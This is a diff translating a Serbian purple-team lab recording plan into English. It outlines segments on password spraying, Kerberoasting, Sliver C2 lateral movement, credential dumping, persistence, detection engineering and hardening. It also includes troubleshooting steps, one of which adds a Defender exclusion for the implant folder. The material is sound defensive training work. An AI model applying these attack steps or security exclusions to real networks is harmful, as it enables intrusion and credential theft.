-1. ✅ Upali sve VM-ove
-2. ✅ Pokreni validation skriptu na svim Windows mašinama
-3. ✅ Verifikuj Splunk forwarder konekciju
-4. ✅ Pokreni Sliver server, mTLS listener, SMB share
+1. ✅ Power on all VMs
+2. ✅ Run the validation script on all Windows machines
+3. ✅ Verify Splunk forwarder connectivity
+4. ✅ Start the Sliver server, mTLS listener, SMB share
 
-### Snimanje — FINALNA STRUKTURA (10 segmenata)
+### Recording — FINAL STRUCTURE (10 segments)
 
-**Princip:** 1 faza = 1 segment. Faza 8 je climax (purple team detection engineering momenat). Seg 10 je bonus koji odvaja L2 od L1 kandidata.
+**Principle:** 1 phase = 1 segment. Phase 8 is the climax (the purple-team detection-engineering moment). Seg 10 is the bonus that separates an L2 from an L1 candidate.
 
-**Kontekst:** CV/portfolio za cybersecurity poziciju, NE YouTube retention. Kraće je bolje — hiring manager skenira 2-3 min po videu.
+**Context:** CV/portfolio for a cybersecurity position, NOT YouTube retention. Shorter is better — a hiring manager scans 2-3 min per video.
 
-#### Puna serija (10 segmenata)
+#### Full series (10 segments)
 
-| # | Segment | Faza | Trajanje | Status |
+| # | Segment | Phase | Duration | Status |
 |---|---|---|---|---|
-| 1 | Lab Setup & Recon | Faza 1 | 15-20 min | Core |
-| 2 | Password Spraying | Faza 2 | 10-12 min | Core |
-| 3 | LOLBin Execution | Faza 3 | 10-12 min | Core |
-| 4 | Kerberoasting | Faza 4 | 12-15 min | Core |
-| 5 | Lateral Movement / Sliver C2 | Faza 5 | 15 min | Core |
-| 6 | Credential Dumping | Faza 6 | 12-15 min | Core |
-| 7 | Persistence | Faza 7 | 10-12 min | Core |
-| 8 | C2 Evasion & Detection Engineering | Faza 8 | 12-15 min | Core (CLIMAX) |
+| 1 | Lab Setup & Recon | Phase 1 | 15-20 min | Core |
+| 2 | Password Spraying | Phase 2 | 10-12 min | Core |
+| 3 | LOLBin Execution | Phase 3 | 10-12 min | Core |
+| 4 | Kerberoasting | Phase 4 | 12-15 min | Core |
+| 5 | Lateral Movement / Sliver C2 | Phase 5 | 15 min | Core |
+| 6 | Credential Dumping | Phase 6 | 12-15 min | Core |
+| 7 | Persistence | Phase 7 | 10-12 min | Core |
+| 8 | C2 Evasion & Detection Engineering | Phase 8 | 12-15 min | Core (CLIMAX) |
 | 9 | Splunk Dashboard Tour | — | 15 min | Core |
 | 10 | Production Hardening: Closing the Gaps | — | 15-20 min | Bonus |
 
-**Ukupno: ~2h 15min – 2h 45min**
+**Total: ~2h 15min – 2h 45min**
 
-#### CV minimum (5 segmenata — preporučeno za prvi pass)
+#### CV minimum (5 segments — recommended for the first pass)
 
-| # | Segment | Trajanje | Zašto |
+| # | Segment | Duration | Why |
 |---|---|---|---|
-| 4 | Kerberoasting | 12-15 min | AD specifičnost, RC4 detection |
-| 6 | Credential Dumping | 12-15 min | Defender/AMSI win — blue team flex |
-| 8 | C2 Evasion & Detection Engineering | 12-15 min | Climax, detection engineering dubina |
-| 9 | Splunk Dashboard Tour | 10-12 min | Hiring manager skoči direktno |
-| 10 | Production Hardening | 15-20 min | L2 vs L1 diferencijator |
+| 4 | Kerberoasting | 12-15 min | AD-specific, RC4 detection |
+| 6 | Credential Dumping | 12-15 min | Defender/AMSI win — blue-team flex |
+| 8 | C2 Evasion & Detection Engineering | 12-15 min | Climax, detection-engineering depth |
+| 9 | Splunk Dashboard Tour | 10-12 min | Where a hiring manager jumps straight |
+| 10 | Production Hardening | 15-20 min | L2 vs L1 differentiator |
 
-**Ukupno: ~1h – 1h 17min**
+**Total: ~1h – 1h 17min**
 
 ---
 
-**Segment 1 — Lab Setup & Recon (15-20 min) — Faza 1**
-- Prikaz lab arhitekture (MARVEL.LOCAL topologija)
-- Sve recon komande (nmap, kerbrute, nxc, certipy, BloodHound)
-- AD CS ESC ranjivosti — Certipy nalazi
-- Pregled Splunk dashboard-a sa baseline-om
+**Segment 1 — Lab Setup & Recon (15-20 min) — Phase 1**
+- Lab architecture walkthrough (MARVEL.LOCAL topology)
+- All recon commands (nmap, kerbrute, nxc, certipy, BloodHound)
+- AD CS ESC findings — Certipy
+- Splunk dashboard baseline review
 
-**Segment 2 — Password Spraying (10-12 min) — Faza 2**
-- Pre-spray recon (lockout polisa check)
-- kerbrute passwordspray sa --delay 100
-- Splunk detekcija EC4771/4768/4625
+**Segment 2 — Password Spraying (10-12 min) — Phase 2**
+- Pre-spray recon (lockout policy check)
+- kerbrute passwordspray with --delay 100
+- Splunk detection EC4771/4768/4625
 - Live dashboard update
 
-**Segment 3 — LOLBin Execution (10-12 min) — Faza 3**
+**Segment 3 — LOLBin Execution (10-12 min) — Phase 3**
 - InstallUtil.exe T1218.004
-- Zašto Defender ne blokira Microsoft signed binary
-- AMSI ne ide kroz InstallUtil path
-- Sysmon EC1 parent-child chain analiza
+- Why Defender doesn't block a Microsoft-signed binary
+- AMSI doesn't cover the InstallUtil path
+- Sysmon EC1 parent-child chain analysis
 
-**Segment 4 — Kerberoasting (12-15 min) — Faza 4**
-- impacket-GetUserSPNs preko Sliver shell-a
+**Segment 4 — Kerberoasting (12-15 min) — Phase 4**
+- impacket-GetUserSPNs via the Sliver shell
 - hashcat offline crack
-- **SQLService description anti-pattern wisdom drop** (centralna poenta)
-- Splunk detekcija EC4769 (TGS request)
+- **SQLService description anti-pattern wisdom drop** (central point)
+- Splunk detection EC4769 (TGS request)
 
-**Segment 5 — Lateral Movement / Sliver C2 (15 min) — Faza 5**
+**Segment 5 — Lateral Movement / Sliver C2 (15 min) — Phase 5**
 - Sliver server, mTLS listener, payload generate
-- Deployment kroz SMB share
-- Network pivot — sa THEPUNISHER na DC port 445/135
-- Zašto mTLS prolazi enterprise TLS inspection
+- Deployment over the SMB share
+- Network pivot — from THEPUNISHER to DC port 445/135
+- Why mTLS defeats enterprise TLS inspection
 
-**Segment 6 — Credential Dumping (12-15 min) — Faza 6**
+**Segment 6 — Credential Dumping (12-15 min) — Phase 6**
 - SAM/SYSTEM/SECURITY hive dump (reg save)
-- DCSync attempt + blokada (fcastle nema replication prava)
-- **Blue team win narativ** — Defender + AMSI + AD permisije = Defense in Depth
+- DCSync attempt: AMSI blocks Mimikatz, SharpKatz fails at RPC 1825 (DRS bind, not permissions)
+- **Blue-team win narrative** — AMSI stopped the tool; least privilege is the durable fix (not "permissions saved us")
 - EC1116/1117 Defender events
 
-**Segment 7 — Persistence (10-12 min) — Faza 7**
+**Segment 7 — Persistence (10-12 min) — Phase 7**
 - schtasks LogonTrigger /ru SYSTEM
 - Masquerading discipline (WindowsUpdateService)
-- 4 event source-a za T1053.005 detection
-- Splunk EC4698 sa XML parsing
+- 4 event sources for T1053.005 detection
+- Splunk EC4698 with XML parsing
 
-**Segment 8 — C2 Evasion & Detection Engineering (12-15 min) — Faza 8 [CLIMAX]**
-- Sliver beaconing analiza (60s + jitter)
-- **Default Sysmon NE HVATA Sliver** — purple team gap
-- Live demo: dodavanje C:\Temp watchlist na Sysmon NetworkConnect
-- Restart Sysmon → EC3 sada radi
-- **Ovo je centralna poenta cele serije** — emulate, detect, gap, iterate
+**Segment 8 — C2 Evasion & Detection Engineering (12-15 min) — Phase 8 [CLIMAX]**
+- Sliver beaconing analysis (60s + jitter)
+- **Default Sysmon does NOT catch Sliver** — the purple-team gap
+- Live demo: adding a C:\Temp watchlist to Sysmon NetworkConnect
+- Restart Sysmon → EC3 now works
+- **This is the central point of the whole series** — emulate, detect, gap, iterate
 
 **Segment 9 — Splunk Dashboard Tour (15 min)**
-- Walkthrough svih 8 detekcija kroz dashboard
-- MITRE ATT&CK mapping vizualizacija
-- Lessons learned + threat hunting next steps
+- Walkthrough of all 8 detections via the dashboard
+- MITRE ATT&CK mapping visualization
+- Lessons learned + threat-hunting next steps
 
 **Segment 10 — Production Hardening: Closing the Gaps (15-20 min) — BONUS**
 
-*Cilj:* Demonstrirati "Before/After Detection Engineering" — pokazati napad → fix → re-run dokaz da fix radi. Tri skill-a u jednom segmentu: threat understanding, prevention, detection engineering. Ovo razdvaja L2 od L1 kandidata.
+The complete hardening playbook (attack → fix → re-run proof) is in `03_detection_playbook.md`. Summary of the 4 demos:
 
-*Struktura — 4 demoa po formatu napad → fix → re-run:*
-
-| Faza | Napad | Hardening Fix | Verifikacija |
+| Phase | Attack | Hardening Fix | Verification |
 |---|---|---|---|
 | 2 | Password Spray fcastle:Password1 | Fine-Grained Password Policy + lockout 5/30min + strong reset | Kerbrute fail + EC4740 lockout |
-| 4 | Kerberoasting SQLService RC4 | AES256 enforcement + 23-char password + description cleanup | hashcat estimate 47 godina + EC4769 enc_type=0x12 |
-| 5 | Sliver implant iz C:\Temp | AppLocker Deny rule za user-writable path-ove | "Blocked by group policy" + EC8004 |
-| 8 | mTLS C2 beacon na 443 | Sysmon NetworkConnect watchlist (GPO deployment) | EC3 hvata beacon iz C:\Temp |
+| 4 | Kerberoasting SQLService RC4 | AES256 enforcement + 23-char password + description cleanup | hashcat estimate 47 years + EC4769 enc_type=0x12 |
+| 5 | Sliver implant from C:\Temp | AppLocker Deny rule for user-writable paths | "Blocked by group policy" + EC8004 |
+| 8 | mTLS C2 beacon on 443 | Sysmon NetworkConnect watchlist (GPO deployment) | EC3 captures the beacon from C:\Temp |
 
-*Closing insight (CENTRALNA POENTA):*
-
-> "Hardening ≠ Detection. Sva četiri napada su zaustavljena ili detektovana, ali nijedan kontrol nije bulletproof. Spray može da postane low-and-slow. AppLocker se bypass-uje kroz signed LOLBin. Sysmon watchlist propušta sve van C:\Temp. Detection je safety net za sve što prođe prevention layer."
-
-*Komande za AD account hygiene (Fix #2):*
-
-```powershell
-# Force AES-only za SQLService
-Set-ADUser -Identity SQLService -KerberosEncryptionType AES256
-
-# Strong password reset
-Set-ADAccountPassword -Identity SQLService -Reset `
-  -NewPassword (ConvertTo-SecureString "Tg7#nQ9pX@2vMw4kL!8jBr5" -AsPlainText -Force)
-
-# Cleanup description
-Set-ADUser -Identity SQLService -Description "SQL Service Account - DO NOT MODIFY"
-```
-
-*Komande za Fine-Grained Password Policy (Fix #1):*
-
-```powershell
-New-ADFineGrainedPasswordPolicy -Name "Strong-Users" -Precedence 10 `
-  -MinPasswordLength 14 -ComplexityEnabled $true `
-  -LockoutThreshold 5 -LockoutDuration "00:30:00" `
-  -LockoutObservationWindow "00:30:00"
-Add-ADFineGrainedPasswordPolicySubject -Identity "Strong-Users" -Subjects "Domain Users"
-```
-
-*Komande za AppLocker (Fix #3):*
-
-```powershell
-New-AppLockerPolicy -RuleType Path -User Everyone -Action Deny `
-  -RulePath "C:\Temp\*","C:\Users\*\AppData\Local\Temp\*" `
-  -RuleNamePrefix "PurpleLab-Block" | Set-AppLockerPolicy -Merge
-Set-Service -Name AppIDSvc -StartupType Automatic
-Start-Service -Name AppIDSvc
-```
-
-*Sysmon config za Fix #4 — već dokumentovan u FAZA 8.*
-
-*Wisdom drop — L1 vs L2 vs L3 vocabulary:*
-
-> "L1 misli alate ('imamo Splunk, pokriveni smo'). L2 misli metodologiju (Detection-as-Code, MITRE ATT&CK coverage). L3 misli strategiju (threat model, attack paths, prevention vs detection investment balance). Ovaj segment ti je dao vokabular za L2 → L3 razgovor."
-
-*Šta sledeće — Lab v2 (closing teaser):*
-
-- NDR layer — pfSense + Suricata/Zeek za JA3 fingerprinting
-- EDR layer — Wazuh ili LimaCharlie
-- Threat Intel — MISP platforma sa Splunk integracijom
-
-### Tips za snimanje
-
-- Koristi tab completion (deluje profesionalno)
-- Imaj sve komande u clipboard-u (ne kucaj uživo komplikovane stringove)
-- Govori dok izvršavaš — ne tišina dok čekaš output
-- Snimi u OBS sa screen capture-om Kali + Splunk + Sliver paralelno
-- 1080p, 30fps dovoljno za demo
-- Edituj posle — ukloni dugе pauze
+**Closing insight (CENTRAL POINT):** Hardening ≠ Detection. All four attacks are either blocked or detected, but no single control is bulletproof. Spray can go low-and-slow. AppLocker can be bypassed via a signed LOLBin. The Sysmon watchlist misses anything outside C:\Temp. Detection is the safety net for everything that gets through the prevention layer.
 
 ---
 
-## TROUBLESHOOTING TOKOM NAPADA
+## TROUBLESHOOTING DURING THE ATTACK
 
-### Sliver sesija pada
+### Sliver session drops
 
 ```bash
-# Proveri da li je Sliver server živ
+# Check whether the Sliver server is alive
 sudo ss -tlnp | grep 443
 
-# Ako port zauzet od starog procesa:
+# If the port is held by an old process:
 sudo kill -9 <PID>
 sudo sliver-server
 ```
 
-### SMB server pada
+### SMB server drops
 
 ```bash
-# Proveri
+# Check
 sudo ss -tlnp | grep 445
 
 # Restart
@@ -715,21 +664,21 @@ sudo kill -9 <PID>
 sudo impacket-smbserver share /tmp/share -smb2support
 ```
 
-### Defender briše implant
+### Defender deletes the implant
 
-- Proveri da je `C:\Temp` u exclusion path-u (GPO)
-- Ako ne, dodaj manuelno (samo za lab):
+- Confirm `C:\Temp` is in the exclusion path (GPO)
+- If not, add manually (lab only):
 ```powershell
 Add-MpPreference -ExclusionPath "C:\Temp"
 ```
 
-### Splunk ne hvata eventi
+### Splunk not capturing events
 
-- Restart forwarder: `Restart-Service SplunkForwarder`
-- Proveri inputs.conf
-- Proveri da je audit policy uključena za relevantnu subcategory
+- Restart the forwarder: `Restart-Service SplunkForwarder`
+- Check inputs.conf
+- Confirm audit policy is enabled for the relevant subcategory
 
 ---
 
-**Kraj Dokumenta 2**  
-**Sledeći:** `03_detection_playbook.md` — Detection Cards po MITRE formatu za svih 8 faza + Production Hardening playbook
+**End of Document 2**
+**Next:** `03_detection_playbook.md` — Detection Cards in MITRE format for all 8 phases + the Production Hardening playbook
